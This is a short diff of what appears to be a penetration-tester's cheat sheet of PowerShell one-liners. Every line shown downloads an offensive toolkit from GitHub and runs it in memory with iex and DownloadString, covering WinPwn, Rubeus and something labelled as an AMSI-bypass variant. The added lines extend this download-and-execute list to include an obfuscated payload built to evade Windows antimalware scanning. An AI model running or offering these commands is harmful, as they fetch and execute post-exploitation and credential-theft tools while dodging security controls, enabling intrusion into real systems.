@@ -28,7 +28,10 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 ----------------------------------------------------------------------------------------------------------------------------------------
 ##WinPwn##
 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn.ps1')
-----------------------------------------------------------------------------------------------------------------------------------------
+
+##For AMSI Bypass use the following: 
+iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/ObfusWinPwn.ps1')----------------------------------------------------------------------------------------------------------------------------------------
+
 ##RUBEUS##
 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/csds-dev-evan/tools/master/tracesecurity') 
 
